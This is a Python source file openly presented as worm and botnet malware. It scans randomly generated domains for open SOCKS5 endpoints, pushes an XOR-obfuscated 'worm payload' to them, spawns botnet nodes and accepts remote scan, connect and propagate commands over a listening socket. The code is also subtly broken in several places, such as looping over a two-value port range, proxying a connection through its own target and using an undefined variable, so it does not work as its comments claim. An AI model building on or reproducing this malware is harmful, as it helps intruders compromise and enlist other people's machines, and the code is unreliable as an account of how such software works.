#!/usr/bin/env python3
"""
Worm-based Botnet Infrastructure with SOCKS5 Proxy
"""
import os
import sys
import socket
import threading
import time
import hashlib
import random
import base64
import json
import struct
import subprocess
import winreg
import dns.resolver
import dns.message
import dns.query
import socks
import requests
import ssl
import logging
import signal
import queue
from collections import deque
from datetime import datetime

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class WormBot:
    def __init__(self):
        self.config = {
            'worm_id': hashlib.sha256(os.urandom(16)).hexdigest()[:16],
            'proxy_list': [],
            'target_domains': [],
            'connection_queue': queue.Queue(),
            'active_connections': {},
            'botnet_nodes': set(),
            'dns_servers': ['8.8.8.8', '1.1.1.1', '114.114.114.114'],
            'port_range': (10000, 65535),
            'max_retries': 5,
            'retry_delay': 10,
            'log_level': 'INFO',
            'debug_mode': False
        }
        
        # Load configuration from file
        self.load_config()
        
        # Setup DNS resolver
        self.dns_resolver = dns.resolver.Resolver()
        self.dns_resolver.nameservers = self.config['dns_servers']
        
        # Signal handlers
        signal.signal(signal.SIGTERM, self.shutdown)
        signal.signal(signal.SIGINT, self.shutdown)
        
        logger.info(f"Bot initialized with ID: {self.config['worm_id']}")

    def load_config(self):
        """Load configuration from file"""
        config_file = 'bot_config.json'
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_config = json.load(f)
                    self.config.update(loaded_config)
                    logger.info("Configuration loaded successfully")
            except Exception as e:
                logger.error(f"Error loading config: {e}")

    def save_config(self):
        """Save configuration to file"""
        try:
            with open('bot_config.json', 'w') as f:
                json.dump(self.config, f, indent=4)
            logger.info("Configuration saved successfully")
        except Exception as e:
            logger.error(f"Error saving config: {e}")

    def generate_target_domains(self):
        """Generate random domain names for propagation"""
        domains = []
        chars = 'abcdefghijklmnopqrstuvwxyz'
        
        for _ in range(50):
            domain = ''.join(random.choice(chars) for _ in range(random.randint(8, 16)))
            tld = random.choice(['com', 'net', 'org', 'info', 'xyz'])
            domains.append(f"{domain}.{tld}")
            
        self.config['target_domains'] = domains
        self.save_config()
        logger.info(f"Generated {len(domains)} target domains")

    def discover_dns_servers(self):
        """Discover DNS servers from system"""
        try:
            # Try Windows DNS
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                     r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
                value = winreg.QueryValueEx(key, "NameServer")[0]
                dns_servers = value.split(',')
                self.config['dns_servers'].extend(dns_servers)
            except:
                pass
                
            # Try Linux DNS
            if os.path.exists('/etc/resolv.conf'):
                with open('/etc/resolv.conf', 'r') as f:
                    for line in f:
                        if line.startswith('nameserver'):
                            dns_servers.append(line.split()[1])
                            
            # Deduplicate
            self.config['dns_servers'] = list(set(self.config['dns_servers']))
            self.save_config()
            logger.info(f"Discovered {len(self.config['dns_servers'])} DNS servers")
        except Exception as e:
            logger.error(f"Error discovering DNS servers: {e}")

    def resolve_domain(self, domain):
        """Resolve domain to IP address"""
        try:
            answers = self.dns_resolver.resolve(domain, 'A')
            return [str(answer) for answer in answers]
        except Exception as e:
            logger.debug(f"DNS resolution failed for {domain}: {e}")
            return []

    def establish_connection(self, ip, port):
        """Establish SOCKS5 connection to target"""
        try:
            # Create SOCKS5 connection
            proxy_socket = socks.socksocket()
            proxy_socket.set_proxy(socks.SOCKS5, ip, port)
            proxy_socket.connect((ip, port))
            
            # Verify connection works
            proxy_socket.send(b'\x05\x01\x00')  # SOCKS5 handshake
            resp = proxy_socket.recv(2)
            
            if resp[1] == 0:  # No auth required
                return proxy_socket
        except Exception as e:
            logger.debug(f"Connection failed to {ip}:{port}: {e}")
        return None

    def spawn_botnet_node(self, parent_ip=None):
        """Spawn new botnet node"""
        # Generate new worm ID
        new_id = hashlib.sha256(os.urandom(16)).hexdigest()[:16]
        
        # Generate new proxy ports
        ports = []
        for _ in range(5):
            ports.append(random.randint(*self.config['port_range']))
            
        # Register new node
        node = {
            'id': new_id,
            'parent': parent_ip,
            'ports': ports,
            'ip': self.get_local_ip(),
            'last_seen': datetime.now().isoformat()
        }
        
        self.config['botnet_nodes'].add(node['id'])
        self.save_config()
        
        logger.info(f"New botnet node spawned: {new_id} (parent: {parent_ip})")
        return node

    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def handle_incoming_connections(self):
        """Handle incoming connections from other bots"""
        while True:
            try:
                # Listen for incoming connections
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind(('0.0.0.0', random.randint(*self.config['port_range'])))
                listener.listen(5)
                
                logger.info(f"Incoming connection listener started on port {listener.getsockname()[1]}")
                
                while True:
                    try:
                        client, addr = listener.accept()
                        logger.info(f"New incoming connection from {addr[0]}:{addr[1]}")
                        
                        # Spawn new botnet node
                        node = self.spawn_botnet_node(addr[0])
                        
                        # Create thread for handling this connection
                        threading.Thread(
                            target=self.handle_client,
                            args=(client, node),
                            daemon=True
                        ).start()
                    except Exception as e:
                        logger.error(f"Error accepting connection: {e}")
            except Exception as e:
                logger.error(f"Listener error: {e}")
                time.sleep(5)

    def handle_client(self, client, node):
        """Handle client connection"""
        try:
            # Send node information
            data = json.dumps(node).encode()
            client.sendall(struct.pack('!I', len(data)) + data)
            
            # Process commands
            while True:
                try:
                    # Receive command
                    size = struct.unpack('!I', client.recv(4))[0]
                    command = json.loads(client.recv(size).decode())
                    
                    # Handle command
                    response = self.execute_command(command, node)
                    
                    # Send response
                    response_data = json.dumps(response).encode()
                    client.sendall(struct.pack('!I', len(response_data)) + response_data)
                except Exception as e:
                    logger.debug(f"Client processing error: {e}")
                    break
        except Exception as e:
            logger.error(f"Client handling error: {e}")
        finally:
            client.close()

    def execute_command(self, command, node):
        """Execute command received from client"""
        response = {
            'success': True,
            'result': None,
            'error': None
        }
        
        try:
            if command['type'] == 'ping':
                response['result'] = {'pong': True}
            elif command['type'] == 'scan':
                # Scan target domains
                results = []
                for domain in command['domains']:
                    ips = self.resolve_domain(domain)
                    if ips:
                        results.append({'domain': domain, 'ips': ips})
                response['result'] = results
            elif command['type'] == 'connect':
                # Connect to target
                proxy = self.establish_connection(command['ip'], command['port'])
                if proxy:
                    response['result'] = {'connected': True}
                else:
                    response['result'] = {'connected': False}
            elif command['type'] == 'propagate':
                # Propagate to new nodes
                new_nodes = []
                for _ in range(command.get('count', 5)):
                    new_node = self.spawn_botnet_node(node['id'])
                    new_nodes.append(new_node)
                response['result'] = {'nodes': new_nodes}
            else:
                response['success'] = False
                response['error'] = f"Unknown command type: {command['type']}"
        except Exception as e:
            response['success'] = False
            response['error'] = str(e)
            
        return response

    def propagate_worm(self):
        """Propagate worm to new targets"""
        while True:
            try:
                # Get next target domain
                if not self.config['target_domains']:
                    self.generate_target_domains()
                    
                domain = self.config['target_domains'].pop(0)
                
                # Resolve domain
                ips = self.resolve_domain(domain)
                if not ips:
                    continue
                    
                # Try to connect to each IP
                for ip in ips:
                    for port in self.config['port_range']:
                        try:
                            # Create SOCKS5 connection
                            proxy_socket = socks.socksocket()
                            proxy_socket.set_proxy(socks.SOCKS5, ip, port)
                            proxy_socket.connect((ip, port))
                            
                            # Verify connection works
                            proxy_socket.send(b'\x05\x01\x00')  # SOCKS5 handshake
                            resp = proxy_socket.recv(2)
                            
                            if resp[1] == 0:  # No auth required
                                # Send worm payload
                                self.send_worm_payload(proxy_socket)
                                
                                # Spawn new botnet node
                                node = self.spawn_botnet_node(ip)
                                
                                # Add to active connections
                                self.config['active_connections'][f"{ip}:{port}"] = {
                                    'node_id': node['id'],
                                    'last_seen': datetime.now().isoformat()
                                }
                                
                                proxy_socket.close()
                                break
                        except Exception as e:
                            continue
                            
                    # If we found a connection, don't try other ports
                    if f"{ip}:{port}" in self.config['active_connections']:
                        break
                        
                # Add domain back to queue
                self.config['target_domains'].append(domain)
                self.save_config()
                
                # Sleep before next propagation attempt
                time.sleep(random.randint(1, 5))
            except Exception as e:
                logger.error(f"Propagation error: {e}")
                time.sleep(5)

    def send_worm_payload(self, socket):
        """Send worm payload to target"""
        try:
            # Get worm payload
            payload = self.get_worm_payload()
            
            # Send payload size
            socket.sendall(struct.pack('!I', len(payload)))
            
            # Send payload
            socket.sendall(payload)
            
            logger.info("Worm payload sent successfully")
        except Exception as e:
            logger.error(f"Payload sending error: {e}")

    def get_worm_payload(self):
        """Get worm payload as byte string"""
        # Base payload with configuration
        payload = (
            b"WORM_PAYLOAD_START\n"
            b"BOT_ID: " + self.config['worm_id'].encode() + b"\n"
            b"PROXY_PORTS: " + json.dumps(self.config['port_range']).encode() + b"\n"
            b"TARGET_DOMAINS: " + json.dumps(self.config['target_domains']).encode() + b"\n"
            b"WORM_PAYLOAD_END"
        )
        
        # Apply simple XOR encryption
        key = 0x42  # Simple XOR key
        encrypted_payload = bytearray()
        
        for byte in payload:
            encrypted_payload.append(byte ^ key)
        
        # Add header and footer for identification
        final_payload = (
            b"XOR_ENCRYPTED_PAYLOAD\n"
            + encrypted_payload
            + b"\nXOR_ENCRYPTED_END"
        )
        
        return final_payload

    def verify_worm_payload(self, payload):
        """Verify and decrypt worm payload"""
        try:
            # Check payload header
            if not payload.startswith(b"XOR_ENCRYPTED_PAYLOAD"):
                return None
                
            # Remove header and footer
            payload_data = payload.replace(b"XOR_ENCRYPTED_PAYLOAD\n", b"").replace(b"\nXOR_ENCRYPTED_END", b"")
            
            # Apply XOR decryption
            key = 0x42  # Same key used for encryption
            decrypted_payload = bytearray()
            
            for byte in payload_data:
                decrypted_payload.append(byte ^ key)
            
            # Parse payload
            lines = bytes(decrypted_payload).decode().split('\n')
            config = {}
            
            for line in lines:
                if ':' in line:
                    key, value = line.split(':', 1)
                    config[key.strip()] = value.strip()
                    
            return config
        except Exception as e:
            logger.error(f"Payload verification failed: {e}")
            return None

    def shutdown(self, signum, frame):
        """Handle shutdown signals"""
        logger.info("Shutting down bot...")
        # Cleanup resources
        sys.exit(0)